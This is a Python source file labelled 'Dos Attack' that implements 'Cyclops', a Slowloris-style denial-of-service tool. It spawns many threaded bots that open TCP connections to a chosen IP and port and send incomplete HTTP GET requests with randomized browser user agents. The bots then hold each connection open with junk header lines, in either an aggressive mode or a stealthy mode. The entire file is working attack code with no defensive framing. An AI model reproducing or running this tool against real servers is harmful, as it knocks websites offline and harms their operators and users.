# Date: 09/25/2018
# Author: Pure-L0G1C
# Description: Dos Attack

import socket
from time import sleep
from threading import Thread
from random import randint, choice
from string import ascii_lowercase


class Useragent(object):

    @property
    def get_win_version(self):
        versions = []
        version = 4.0
        while version <= 10:
            versions.append(version)
            version = round(version+0.1, 2)
        return choice(versions)

    @property
    def get_chrome_version(self):
        a = randint(40, 69)
        b = randint(2987, 3497)
        c = randint(80, 140)
        return '{}.0.{}.{}'.format(a, b, c)

    def get(self):
        a = 'Mozilla/5.0 (Windows NT {}; Win64; x64)'.format(self.get_win_version)
        b = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(
            self.get_chrome_version)
        return '{} {}'.format(a, b)


class Session(object):

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self, header):
        is_connected = False
        try:
            self.session.connect((self.ip, self.port))
            self.send_packet(header)
            is_connected = True
        except:
            pass
        finally:
            return is_connected

    def send_packet(self, packet):
        sent = False
        try:
            self.session.sendall(packet)
            sent = True
        except:
            pass
        finally:
            return sent

    def close(self):
        try:
            self.session.close()
        except:
            pass


class Bot(object):

    def __init__(self, ip, port, is_aggressive):
        self.ip = ip
        self.port = port
        self.session = None
        self.is_alive = True
        self.useragent = None
        self.useragent_usage = 0
        self.max_useragent_usage = 16
        self.useragent_obj = Useragent()
        self.is_aggressive = is_aggressive
        self._header = '''
      GET /?{} HTTP/1.1\r\n
      User-Agent: {}\r\n\r\n
      Accept-Language: en-US,en;q=0.9\r\n
      Accept-Encoding: gzip, deflate, br\r\n
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n
      '''.replace('\n\n', '\n').replace('\nGET', 'GET')

    def sleep(self):
        for _ in range(randint(5, 10)):
            if self.is_alive:
                sleep(1)

    def start(self):
        while self.is_alive:
            try:
                self.get_session()
                if not self.session.connect(self.header):
                    self.session.close()
            except:
                pass
            else:
                for _ in range(2):
                    pkt = self.packet
                    if not self.is_alive:
                        break
                    if self.session.send_packet(pkt):
                        if not self.is_aggressive:
                            self.sleep()
                    else:
                        break
                self.session.close()

    def stop(self):
        self.is_alive = False
        if self.session:
            self.session.close()

    def gen_useragent(self):
        if not self.useragent_usage:
            self.useragent = self.useragent_obj.get()
        self.useragent_usage = 0 if self.useragent_usage >= self.max_useragent_usage else self.useragent_usage+1

    @property
    def header(self):
        self.gen_useragent()
        return self._header.format(self.text, self.useragent).encode()

    @property
    def packet(self):
        return 'X-a: {}\r\n\r\n'.format(self.text).encode()

    @property
    def text(self):
        printables = ascii_lowercase + ''.join([str(_) for _ in range(10)])
        return ''.join([choice(printables) for _ in range(randint(3, 9))])

    def get_session(self):
        self.session = Session(self.ip, self.port)


class BotManager(object):

    def __init__(self, ip, port, is_aggressive, max_bots):
        self.bots = [Bot(ip, port, is_aggressive) for _ in range(max_bots)]
        self.is_alive = True
        self.port = port
        self.ip = ip

    def start(self):
        session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            session.connect((self.ip, self.port))
        except:
            print('Error: Unable to connect to the target. Proceeding anyway')

        for bot in self.bots:
            t = Thread(target=bot.start)
            t.daemon = True
            t.start()

    def stop(self):
        for bot in self.bots:
            t = Thread(target=bot.stop)
            t.daemon = True
            t.start()
        self.is_alive = False


class Cyclops(object):

    def __init__(self, ip, port, threads, is_aggressive=True):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.is_aggressive = is_aggressive
        self.bot_manager = BotManager(ip, port, is_aggressive, threads)

    def start(self):
        try:
            Thread(target=self.bot_manager.start, daemon=True).start()
            mode = 'Aggressive' if self.is_aggressive else 'Stealthy'
            print('Target: {}:{}\nMode: {}\nBots: {}'.format(
                self.ip, self.port, mode, self.threads))
        except:
            self.bot_manager.stop()

    def stop(self):
        self.bot_manager.stop()
